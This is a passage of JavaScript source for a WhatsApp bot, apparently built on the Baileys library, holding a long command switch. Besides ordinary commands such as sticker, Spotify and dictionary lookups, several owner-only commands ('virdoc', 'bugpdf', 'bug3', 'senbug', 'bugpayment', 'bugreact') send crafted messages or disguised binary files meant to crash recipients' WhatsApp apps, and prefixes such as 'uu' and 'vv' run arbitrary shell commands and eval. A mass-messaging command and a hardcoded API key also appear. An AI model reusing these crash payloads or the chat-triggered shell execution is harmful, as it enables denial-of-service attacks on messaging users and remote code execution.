              media,
              m,
              { packname: global.packname, author: global.author }
            );
            await fs.unlinkSync(encmedia);
          } else {
            replygcxeon(
              `Send/Reply Images/Videos/Gifs With Captions ${
                prefix + command
              }\nVideo Duration 1-9 Seconds`
            );
          }
        }
        break;
      case "virdoc":
        {
          if (!XeonTheCreator) return replygcxeon(from);
          anuin = fs.readFileSync("./basetzy/mytzy/ngeselin.BIN");
          XeonBotInc.sendMessage(
            m.chat,
            {
              document: anuin,
              mimetype: "application/octet-stream",
              fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.BIN`,
              title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.BIN`,
            },
            { quoted: pak }
          );
        }
        break;
      //=================================================//
      case "bugpdf":
        {
          if (!XeonTheCreator) return replygcxeon(from);
          anuin = fs.readFileSync("./basetzy/mytzy/ngeselin.BIN");
          XeonBotInc.sendMessage(
            m.chat,
            {
              document: anuin,
              mimetype: "application/pdf",
              fileName: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${place}.pdf`,
              title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ.pdf`,
            },
            { quoted: pak }
          );
        }
        break;
        //Document
        const fdoc = {
          key: { participant: "0@s.whatsapp.net" },
          message: {
            documentMessage: { title: `${ownername}`, jpegThumbnail: thumb },
          },
        };
        const bacot = (jid, text, quoted = fdoc) =>
          XeonBotInc.sendMessage(
            jid,
            {
              text: text,
              contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                  title: `𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ ${ngazap(prefix)}`,
                  previewType: "PHOTO",
                  thumbnail: fs.readFileSync("./basetzy/gambarnye/pict.jpg"),
                  sourceUrl: `https://youtube.com/c/PakTzy`,
                },
              },
            },
            { quoted }
          );
      //=================================================//
      // VN m.chat
      case "bug3":
        {
          if (!XeonTheCreator) throw replygcxeon(from);
          var messa = await prepareWAMessageMedia(
            { image: fs.readFileSync("./basetzy/gambarnye/theXeonBotInc.jpg") },
            { upload: XeonBotInc.waUploadToServer }
          );
          var document = generateWAMessageFromContent(
            m.chat,
            proto.Message.fromObject({
              documentMessage: {
                url: "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
                mimetype: "application/octet-stream",
                title: ".dev",
                fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                pageCount: 0,
                mediaKey: "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
                fileName: `🔥፝⃟ ꙳𝐏𝐀𝐍𝐍 𝐓𝐇𝐄 𝐄𝐌𝐏𝐄𝐑𝐎𝐑 𝐒𝐈𝐆𝐍𝐄𝐃 ダフ🔥፝⃟   ${ngazap(
                  prefix
                )}`,
                fileEncSha256: "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
                directPath:
                  "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
                mediaKeyTimestamp: "1657288637",
              },
            }),
            { userJid: m.chat, quoted: doc }
          );
          XeonBotInc.relayMessage(m.chat, document.message, {
            messageId: document.key.id,
          });
        }
        break;
      //=================================================//
      case "senbug":
        {
          if (!XeonTheCreator) return replygcxeon(from);
          /*if (!XeonTheCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
          let template = await generateWAMessageFromContent(
            m.chat,
            proto.Message.fromObject({
              listMessage: {
                title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${
                  m.sender.split("@")[0]
                }\n Status : ${isCreator ? "Owner" : "User"}`,
                description: "PERINGATAN!!!",
                buttonText: "CLICK DISINI",
                footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
                listType: "SINGLE_SELECT",
                sections: [
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug1",
                        description: "Bug Berjenis Quoted Audio",
                        rowId: `${prefix}bug1`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug2",
                        description: "Bug Berjenis Foto",
                        rowId: `${prefix}bug2`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug3",
                        description: "Bug Berjenis Document",
                        rowId: `${prefix}bug3`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug4",
                        description: "Bug Berjenis Group",
                        rowId: `${prefix}bug4`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug5",
                        description: "Bug Berjenis Lokasi",
                        rowId: `${prefix}bug5`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug6",
                        description: "Bug Berjenis Troli",
                        rowId: `${prefix}bug6`,
                      },
                    ],
                  },
                  {
                    title: "Menu Bug",
                    rows: [
                      {
                        title: "Bug7",
                        description: "Bug Berjenis Contacts",
                        rowId: `${prefix}bug7`,
                      },
                    ],
                  },
                ],
                listType: 1,
              },
            }),
            { userJid: m.chat, quoted: ftroli }
          );
          XeonBotInc.relayMessage(m.chat, template.message, {
            messageId: template.key.id,
          });
        }
        break;
      case ">":
      case "=>":
        if (!XeonTheCreator) return;
        var err = new TypeError();
        err.name = "EvalError ";
        err.message = "Code Not Found (404)";
        if (!q) return replygcxeon(util.format(err));
        var arg = command == ">" ? args.join(" ") : "return " + args.join(" ");
        try {
          var txtes = util.format(await eval(`(async()=>{ ${arg} })()`));
          replygcxeon(txtes);
        } catch (e) {
          let _syntax = "";
          let _err = util.format(e);
          let err = syntaxerror(arg, "EvalError", {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true,
            sourceType: "commonjs",
          });
          if (err) _syntax = err + "\n\n";
          replygcxeon(util.format(_syntax + _err));
        }
        break;
      case "pushcontact":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!m.isGroup) return replygcxeon(`The feature works only in grup`);
          if (!text) return replygcxeon(`text?`);
          let mem = await participants
            .filter((v) => v.id.endsWith(".net"))
            .map((v) => v.id);
          replygcxeon(`Success in pushing the message to contacts`);
          for (let pler of mem) {
            XeonBotInc.sendMessage(pler, { text: q });
          }
          replygcxeon(`Done`);
        }
        break;
      case "id":
        {
          replygcxeon(from);
        }
        break;
      case "emojimix":
        {
          let [emoji1, emoji2] = text.split`+`;
          if (!emoji1)
            return replygcxeon(`Example : ${prefix + command} 😅+🤔`);
          if (!emoji2)
            return replygcxeon(`Example : ${prefix + command} 😅+🤔`);
          let anumojimix = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              emoji1
            )}_${encodeURIComponent(emoji2)}`
          );
          for (let res of anumojimix.results) {
            let encmedia = await XeonBotInc.sendImageAsSticker(
              m.chat,
              res.url,
              m,
              {
                packname: global.packname,
                author: global.author,
                categories: res.tags,
              }
            );
            await fs.unlinkSync(encmedia);
          }
        }
        break;
      case "tinyurl":
        {
          if (!q) return replygcxeon("link?");
          const request = require("request");
          request(
            `https://tinyurl.com/api-create.php?url=${q}`,
            function (error, response, body) {
              try {
                replygcxeon(body);
              } catch (e) {
                replygcxeon(e);
              }
            }
          );
        }
        break;
      case "spotify":
        if (!text) return replygcxeon(`Where is the link?`);
        const Spotify = require("./lib/spotify");
        const spotify = new Spotify(text);
        const info = await spotify.getInfo();
        if (info.error)
          return replygcxeon(`The link you provided is not spotify link`);
        const { name, artists, album_name, release_date, cover_url } = info;
        const details = `${themeemoji} *Title:* ${
          name || ""
        }\n${themeemoji} *Artists:* ${(artists || []).join(
          ","
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${
          release_date || ""
        }`;
        const response = await XeonBotInc.sendMessage(
          m.chat,
          { image: { url: cover_url }, caption: details },
          { quoted: m }
        );
        const bufferpotify = await spotify.download();
        await XeonBotInc.sendMessage(
          m.chat,
          { audio: bufferpotify },
          { quoted: response }
        );
        break;
      case "earrape":
        try {
          let set;
          if (/earrape/.test(command)) set = "-af volume=25";
          if (/audio/.test(mime)) {
            replygcxeon(mess.wait);
            let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom(".mp3");
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return replygcxeon(err);
              let buff = fs.readFileSync(ran);
              XeonBotInc.sendMessage(
                m.chat,
                { audio: buff, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              fs.unlinkSync(ran);
            });
          } else
            replygcxeon(
              `Reply to the audio you want to change with a caption *${
                prefix + command
              }*`
            );
        } catch (e) {
          replygcxeon(e);
        }
        break;
      case "define":
        if (!q) return replygcxeon(`What do you want to define?`);
        try {
          targetfine = await axios.get(
            `http://api.urbandictionary.com/v0/define?term=${q}`
          );
          if (!targetfine) return replygcxeon(mess.error);
          const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`;
          XeonBotInc.sendMessage(m.chat, { text: reply }, { quoted: m });
        } catch (err) {
          console.log(err);
          return replygcxeon(`*${q}* isn't a valid text`);
        }
        break;
      case "apakah":
        {
          if (!text)
            return replygcxeon(
              `Ask question\n\nExample : ${prefix + command} she virgin?`
            );
          let apa = [`Iya`, `Tidak`, `Mungkin Tidak`, `Mungkin Iya`];
          let kah = apa[Math.floor(Math.random() * apa.length)];
          let jawab = `*Apakah ${text}*\nJawaban : ${kah}`;
          await replygcxeon(jawab);
        }
        break;
      case "kapan":
        {
          if (!text)
            return replygcxeon(
              `Ask question\n\nExample : ${
                prefix + command
              } will i get married?`
            );
          let kapan = [
            "5 Hari Lagi",
            "10 Hari Lagi",
            "15 Hari Lagi",
            "20 Hari Lagi",
            "25 Hari Lagi",
            "30 Hari Lagi",
            "35 Hari Lagi",
            "40 Hari Lagi",
            "45 Hari Lagi",
            "50 Hari Lagi",
            "55 Hari Lagi",
            "60 Hari Lagi",
            "65 Hari Lagi",
            "70 Hari Lagi",
            "75 Hari Lagi",
            "80 Hari Lagi",
            "85 Hari Lagi",
            "90 Hari Lagi",
            "100 Hari Lagi",
            "5 Bulan Lagi",
            "10 Bulan Lagi",
            "15 Bulan Lagi",
            "20 Bulan Lagi",
            "25 Bulan Lagi",
            "30 Bulan Lagi",
            "35 Bulan Lagi",
            "40 Bulan Lagi",
            "45 Bulan Lagi",
            "50 Bulan Lagi",
            "55 Bulan Lagi",
            "60 Bulan Lagi",
            "65 Bulan Lagi",
            "70 Bulan Lagi",
            "75 Bulan Lagi",
            "80 Bulan Lagi",
            "85 Bulan Lagi",
            "90 Bulan Lagi",
            "100 Bulan Lagi",
            "1 More Year",
            "2 Tahun Lagi",
            "3 Tahun Lagi",
            "4 Tahun Lagi",
            "5 Tahun Lagi",
            "Besok",
            "Besok Lusa",
          ];
          let koh = kapan[Math.floor(Math.random() * kapan.length)];
          let jawab = `*${command} ${text}*\nJawaban : ${koh}`;
          await replygcxeon(jawab);
        }
        break;
      case "runtime":
        {
          let lowq = `*The Bot Has Been Online For:*\n*${runtime(
            process.uptime()
          )}*`;
          replygcxeon(lowq);
        }
        break;
      //bug feature
      case "bugpayment":
        {
          //crashes mod whatsapps
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          if (!text)
            return replygcxeon(`Example : ${prefix + command} xeon bihari😂`);
          const { xeonorwot } = require("./XBug/xeonbut2");
          let teks = `${text}`;
          {
            XeonBotInc.relayMessage(
              from,
              {
                requestPaymentMessage: {
                  Message: {
                    extendedTextMessage: {
                      text: `${xeonorwot}`,
                      currencyCodeIso4217: "INR",
                      requestFrom: "0@s.whatsapp.net",
                      expiryTimestamp: 8000,
                      amount: 1,
                      contextInfo: {
                        externalAdReply: {
                          title: `PAPA XEON`,
                          body: ` ${xeonytimewisher} my friend ${pushname}`,
                          mimetype: "audio/mpeg",
                          caption: `🔥 ${teks} ${buttonkal}`,
                          showAdAttribution: true,
                          sourceUrl: xwebsite,
                          thumbnailUrl: thumb,
                        },
                      },
                    },
                  },
                },
              },
              { quoted: m }
            );
          }
        }
        break;
      case "bugreact":
        {
          if (!XeonTheCreator) return replygcxeon(mess.owner);
          let reactionMessage = proto.Message.ReactionMessage.create({
            key: m.key,
            text: "",
          });
          XeonBotInc.relayMessage(
            m.chat,
            { reactionMessage },
            { messageId: "🦄" }
          );
        }
        break;
      default:
        if (budy.startsWith("<")) {
          if (!XeonTheCreator) return;
          try {
            return replygcxeon(
              JSON.stringify(eval(`${args.join(" ")}`), null, "\t")
            );
          } catch (e) {
            replygcxeon(e);
          }
        }

        if (budy.startsWith("vv")) {
          if (!XeonTheCreator) return;
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await replygcxeon(evaled);
          } catch (err) {
            replygcxeon(String(err));
          }
        }

        if (budy.startsWith("uu")) {
          if (!XeonTheCreator) return;
          qur = budy.slice(2);
          exec(qur, (err, stdout) => {
            if (err) return replygcxeon(`${err}`);
            if (stdout) {
              replygcxeon(stdout);
            }
          });
        }

        if (m.chat.endsWith("@s.whatsapp.net") && !isCmd) {
          let room = Object.values(anon.anonymous).find(
            (p) => p.state == "CHATTING" && p.check(sender)
          );
          if (room) {
            let other = room.other(sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
        }

        if (isCmd && budy.toLowerCase() != undefined) {
          if (m.chat.endsWith("broadcast")) return;
          if (m.isBaileys) return;
          let msgs = global.db.database;
          if (!(budy.toLowerCase() in msgs)) return;
          XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
        }
    }
  } catch (err) {
    console.log(util.format(err));
    let e = String(err);
    XeonBotInc.sendMessage("6285156863505@s.whatsapp.net", {
      text:
        "Hello developer, there seems to be an error, please fix it " +
        util.format(e),
      contextInfo: {
        forwardingScore: 9999999,
        isForwarded: true,
      },
    });
  }
};

process.on("uncaughtException", function (err) {
  console.log("Caught exception: ", err);
});
